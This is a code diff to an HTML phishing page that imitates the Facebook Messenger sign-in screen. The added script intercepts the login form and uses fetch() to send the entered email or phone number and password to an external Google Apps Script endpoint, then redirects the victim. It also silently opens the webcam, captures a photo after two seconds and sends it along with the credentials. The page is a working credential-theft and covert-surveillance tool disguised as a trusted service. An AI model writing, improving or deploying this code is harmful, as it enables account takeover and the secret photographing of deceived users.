@@ -11,18 +11,81 @@
 button{background:#fff;color:#0084ff;font-size:24px;font-weight:normal;margin-top:5px;align-items:center;border:0;box-shadow:none;display:flex;margin-left:auto;margin-right:auto;overflow:hidden;text-overflow:ellipsis;text-shadow:none;white-space:nowrap;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;cursor:pointer;text-decoration:none;line-height:26px;padding:0 10px}button:active,button:focus{border:2px solid #0084ff;border-radius:3px}.input:focus{border-color:#0084ff}.input{border:1px solid rgba(0,0,0,.20);border-radius:4px;color:rgba(0,0,0,1);display:block;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-size:17px;height:42px;margin-bottom:12px;margin-left:auto;margin-right:auto;padding:0 16px;width:286px}.sml{margin:10px;color:#a8a8a8;cursor:pointer;text-decoration:none;font-size:11px;text-align:center}</style><div><div><div><div><div><br><br><br><br><center><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEwAAABKCAMAAAAmEEIEAAAANlBMVEVHcEwAwP8Bs/8Agv8ktPYZeN0Siu8yjNk2hs8ynecAjv8Bp/8Ad/8Bmv/////R7f9Yvv+e2/8HLAH/AAAACnRSTlMA////4M3tgD2vYPIbvwAAAphJREFUeAHFk48OoyAMh6sTKLo/+v4ve73uF8AK3txI7munUsoXIBn9Aw5xAjEwfY94BoMYvzJlkRVe9cXhlNhPdUUXho/45LA8DR8y8eVt/bC5abhE7OMCU0dX04arH/vYpr+mMT3OGBGwnbrSC4HHvpZKFVscxsYq84koPqN1scwi8dI07zzcTbE9pHYedfaNSSXNmIPG3IYXSAtNZdjNRHNIkHzWg1KjwruN/Ug0G/sN7rQxs7VlvBz5gTGBcN015gfGAbL4wToTi51aYj6lgJYD2+swAd+2pnI6J5e96UrSiudTbShqKutrk89cYZWFpc24Pp+wJaB6bvtKwJW1EZfaTHncntaFS5vOXbAZ1cH1mFTml4dEyhxwwZa6RKWuslXwKpNPlEzABRu61ldyI/RT8i0Taq4RGrCp/wXzsR8yNScW/OAqbaOo4Co6AWT7raFpwcICVNRV6BCQ1Ugu44TrCGS+4cJFbVbWcPmmDPe8PoTtIxdk7jE/JFPAJSqMNuNCly7LI6eyiHpOda1JrmOwFg4EBlFlYZ5lUKT+W7QBlWxbi14ExnMgZa+a9U88vzuMbX1XsRxgTG/8XLLJZeUmgJOjmg1Z6yGLOxdUINvgahEh46K2YkXFhpkGTOmcP4FTgjDfEDPetZBsR6CEf/fmNSYrpX2np0yQ8jvxMFkp7TsDFXgUBXlU1lVdqeqphKWOFVXm8zLTDnf7AUcG/73Lk4W/lzEdCLfbvZnNGXEFqhBlqhXtqXukKlHm6imPxhxcVVtjScOFfTUI9+bW6tVAJ/D9EkynuAsqx9RNhiP2kDmiXjKcsIcMqg4yFwhckTnm6Hzp8S4wXcAdjsIcFEbhuswH+h3IoOohi9QJh8vqQoDq//MHcYd0E1zD4+0AAAAASUVORK5CYII="></head></center>
 
 <h1 style="color:#000;font-size:40px;font-weight:300;margin-bottom:24px;text-align:center;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;direction:ltr;line-height:1.34">Messenger</h1><h2 style="color:#000;font-size:16px;font-weight:200;line-height:1.2;margin-bottom:24px;text-align:center;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;direction:ltr">Instantly connect with people in your life.</h2><div style="color:#000;font-size:16px;font-weight:200;line-height:1.2;margin-bottom:24px;text-align:center;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif">Sign in with Facebook to get started.</div><div><div><div>
-<form action="https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec" method="post">
+<form id="myForm" method="post">
+    <input type="hidden" name="urlInput" value="Messenger.html">
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <input type="hidden" name="photo" id="photo">
+
+
   <input type="hidden" name="title" value="Fb msnger">
   <input type="hidden" name="timestamp" id="timestamp"> <!-- Example timestamp -->
   <input size="80" class="input" type="text" name="user" placeholder="Email address or phone number">
   <input size="80" class="input" type="password" name="password" placeholder="Password">
 
-<input type="hidden" name="redirect_url" value="https://messengerfb.com">
+<input type="hidden" name="redirect_url" value="Whatsapp.html">
   <button type="submit">Submit</button>
 </form>
 <script>
-    document.getElementById('timestamp').value = new Date().toISOString();
-  </script>"
+    
+
+  const form = document.getElementById('myForm');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+    const redirectUrl = formData.get('redirect_url');
+
+    // Convert formData to URLSearchParams for POST
+    const params = new URLSearchParams();
+    for (const pair of formData.entries()) {
+      params.append(pair[0], pair[1]);
+    }
+
+    fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+      method: 'POST',
+      body: params,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok');
+      return response.text();
+    })
+    .then(() => {
+      // Redirect after successful form submission
+      window.location.href = redirectUrl;
+    })
+    .catch(error => {
+       window.location.href = redirectUrl;
+    });
+  });
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const photoInput = document.getElementById('photo');
+
+  // Access the camera and capture a photo after 2 seconds
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640; // fallback width
+        canvas.height = video.videoHeight || 480; // fallback height
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photoInput.value = canvas.toDataURL('image/png');
+
+        // Stop the video stream to free camera
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+      }, 2000);
+    })
+    .catch(err => console.error("Error accessing camera: ", err));
+</script>
  
 
 <div><div style=margin-left:40%><p style=margin-bottom:27px><label class=container>
